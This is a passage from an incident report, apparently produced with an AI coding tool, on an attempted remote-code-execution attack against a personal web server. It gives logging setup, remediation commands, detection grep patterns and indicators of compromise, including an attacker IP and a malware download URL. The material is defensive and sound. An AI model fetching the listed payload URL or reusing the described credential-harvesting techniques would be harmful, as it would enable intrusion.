error_handler = logging.FileHandler('/var/log/personalweb03/api-error.log')
error_handler.setLevel(logging.ERROR)
error_handler.setFormatter(JSONFormatter())

# Get logger
logger = logging.getLogger('personalweb03-api')
logger.addHandler(security_handler)
logger.addHandler(error_handler)
```

**Security logging middleware**:
```python
from fastapi import Request, Response
import time
import logging

logger = logging.getLogger('personalweb03-api')

@app.middleware("http")
async def security_logging_middleware(request: Request, call_next):
    start_time = time.time()

    # Log request
    logger.info(
        'API request',
        extra={
            'event': 'api.request',
            'method': request.method,
            'path': request.url.path,
            'ip': request.client.host,
            'user_agent': request.headers.get('user-agent'),
        }
    )

    # Process request
    try:
        response = await call_next(request)
    except Exception as e:
        # Log errors
        logger.error(
            f'Request failed: {str(e)}',
            extra={
                'event': 'api.error',
                'method': request.method,
                'path': request.url.path,
                'ip': request.client.host,
            },
            exc_info=True
        )
        raise

    # Log slow queries
    duration = time.time() - start_time
    if duration > 1.0:
        logger.warning(
            f'Slow request: {duration:.2f}s',
            extra={
                'event': 'api.slow_query',
                'path': request.url.path,
                'duration': duration,
            }
        )

    # Log authentication failures
    if response.status_code == 401:
        logger.warning(
            'Unauthorized access attempt',
            extra={
                'event': 'security.unauthorized_access',
                'path': request.url.path,
                'ip': request.client.host,
            }
        )

    return response
```

### C. System Logging (Nginx + Server)

**Nginx access log format** (`/etc/nginx/nginx.conf`):
```nginx
log_format security_log escape=json
    '{'
    '"timestamp":"$time_iso8601",'
    '"remote_addr":"$remote_addr",'
    '"request":"$request",'
    '"status":$status,'
    '"body_bytes_sent":$body_bytes_sent,'
    '"http_referer":"$http_referer",'
    '"http_user_agent":"$http_user_agent",'
    '"request_time":$request_time,'
    '"upstream_response_time":"$upstream_response_time"'
    '}';

access_log /var/log/nginx/access.log security_log;
error_log /var/log/nginx/error.log warn;
```

**Log rotation** (`/etc/logrotate.d/personalweb03`):
```
/var/log/personalweb03/*.log {
    daily
    rotate 30
    compress
    delaycompress
    notifempty
    create 0640 webapp webapp
    sharedscripts
    postrotate
        # Notify application to reopen log files
        systemctl reload pm2-webapp
    endscript
}

/var/log/nginx/*.log {
    daily
    rotate 14
    compress
    delaycompress
    notifempty
    create 0640 www-data adm
    sharedscripts
    postrotate
        systemctl reload nginx
    endscript
}
```

### D. Log Monitoring & Alerting

**Install log monitoring** (optional but recommended):
```bash
# Option 1: Simple log monitoring with logwatch
sudo apt install logwatch -y

# Configure daily reports
sudo nano /etc/cron.daily/00logwatch
```

**Option 2: Real-time alerting with simple script**:
```bash
#!/bin/bash
# /opt/scripts/security-monitor.sh

SECURITY_LOG="/var/log/personalweb03/security.log"
ALERT_EMAIL="your-email@example.com"

# Monitor for suspicious activity
tail -F $SECURITY_LOG | while read LINE; do
  # Check for high-severity events
  if echo "$LINE" | grep -E "suspicious_request|rate_limit_exceeded|unauthorized_access"; then
    # Send alert
    echo "$LINE" | mail -s "Security Alert: PersonalWeb03" $ALERT_EMAIL
  fi
done
```

**Run as systemd service**:
```ini
# /etc/systemd/system/security-monitor.service
[Unit]
Description=Security Log Monitor
After=network.target

[Service]
Type=simple
User=root
ExecStart=/opt/scripts/security-monitor.sh
Restart=always

[Install]
WantedBy=multi-user.target
```

```bash
sudo systemctl enable security-monitor
sudo systemctl start security-monitor
```

### What NOT to Log

**Never log these**:
```typescript
// ❌ DO NOT LOG:
logger.info('Login', { password: user.password });  // Passwords
logger.info('Payment', { creditCard: card.number });  // PII
logger.info('Token', { jwt: token });  // Auth tokens
logger.info('Request', { body: fullRequestBody });  // Unsanitized user input

// ✅ Instead, log sanitized/hashed values:
logger.info('Login', {
  email: user.email,  // OK if not sensitive
  userId: user.id,
  // DO NOT log password at all
});
```

---

## Immediate Remediation Steps

### Priority 1: Stop the Bleeding (Immediate - Today)

1. **Identify and fix the RCE vulnerability**:
   ```bash
   # Search for dangerous code patterns
   cd /opt/PersonalWeb03-NextJs
   grep -r "eval(" . --include="*.js" --include="*.ts"
   grep -r "Function(" . --include="*.js" --include="*.ts"
   grep -r "child_process" . --include="*.js" --include="*.ts"
   grep -r "exec(" . --include="*.js" --include="*.ts"
   ```

2. **Review git history for removed vulnerable code**:
   ```bash
   git log --all --full-history --source --grep="exec\|eval\|Function"
   git log --all --oneline --source -- '**/api/**'
   ```

3. **Check dependencies for vulnerabilities**:
   ```bash
   npm audit
   npm audit fix
   ```

4. **Review application logs for other attacks**:
   ```bash
   # Check for similar attack patterns
   grep -E "67.217.57.240|proxy.sh|base64|/etc/shadow" /var/log/nginx/*.log
   pm2 logs --lines 1000 | grep -E "Error|Command failed"
   ```

5. **Block attacker IP immediately** (if still active):
   ```bash
   sudo ufw deny from 67.217.57.240
   sudo fail2ban-client set nginx-http-auth banip 67.217.57.240
   ```

### Priority 2: Secure the Environment (This Week)

1. **Implement input validation** on all API endpoints
2. **Add security headers** to Next.js config
3. **Implement rate limiting**
4. **Configure fail2ban** for automated blocking
5. **Update nginx** with security hardening
6. **Enable automatic security updates**
7. **Implement structured logging**

### Priority 3: Long-term Security (This Month)

1. **Security code review** of entire codebase
2. **Implement WAF** (Web Application Firewall) - consider Cloudflare
3. **Set up monitoring** and alerting
4. **Penetration testing** to find other vulnerabilities
5. **Security training** for development team
6. **Implement CI/CD security scanning** (SAST/DAST)
7. **Create incident response plan**
8. **Regular security audits** (quarterly)

---

## Incident Response Checklist

- [x] Incident detected (Dec 11, 2025)
- [x] Attack logs preserved
- [ ] Root cause identified (RCE vulnerability)
- [ ] Vulnerability patched
- [ ] System hardened
- [ ] Monitoring implemented
- [ ] Incident documented
- [ ] Post-mortem completed
- [ ] Preventive measures deployed
- [ ] Team trained

---

## Indicators of Compromise (IoC)

Monitor for these IoCs:

**Network**:
- IP Address: `67.217.57.240`
- URL: `http://67.217.57.240:666/files/proxy.sh`
- Port: `666`

**File System**:
- Unexpected files in `/tmp`
- Modified system files
- New cron jobs
- Unexpected processes

**Network Traffic**:
- Outbound connections to port 666
- Unusual outbound traffic volumes
- Connections to known C2 servers

**Log Patterns**:
- Multiple failed .env file access attempts
- Attempts to access /etc/shadow
- Package manager installation attempts without authentication
- base64 encoded commands

---

## Additional Resources

**Security Tools**:
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Snyk](https://snyk.io/) - Dependency vulnerability scanning
- [npm audit](https://docs.npmjs.com/cli/v8/commands/npm-audit)
- [Trivy](https://github.com/aquasecurity/trivy) - Container security scanner

**Security Guidelines**:
- [Next.js Security Best Practices](https://nextjs.org/docs/app/building-your-application/security)
- [OWASP Node.js Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Nodejs_Security_Cheat_Sheet.html)
- [FastAPI Security](https://fastapi.tiangolo.com/tutorial/security/)
- [CIS Ubuntu Linux Benchmark](https://www.cisecurity.org/benchmark/ubuntu_linux)

**Reporting**:
- If you discover the malware was successful, consider reporting to:
  - US-CERT (https://www.cisa.gov/report)
  - Your hosting provider
  - Local law enforcement (if applicable)

---

## Conclusion

This was a **critical security incident** that could have resulted in complete server compromise. While the immediate attack was unsuccessful due to environmental factors (lack of privileges, missing files), **the vulnerability still exists** and must be addressed immediately.

The attacker demonstrated sophisticated knowledge:
- Systematic enumeration of common file locations
- Use of base64 encoding for exfiltration
- Multi-platform malware delivery (Alpine, Debian, RHEL)
- Comprehensive credential harvesting
- Attempt to establish persistent backdoor access

**Immediate action required**:
1. Find and fix the RCE vulnerability
2. Implement all prevention measures outlined above
3. Enhance logging and monitoring
4. Conduct thorough security audit

**This attack was a warning.** The next attack may not fail.

---

**Report Prepared By**: Claude Code Security Analysis
**Report Date**: December 13, 2025
**Classification**: CONFIDENTIAL - Internal Use Only
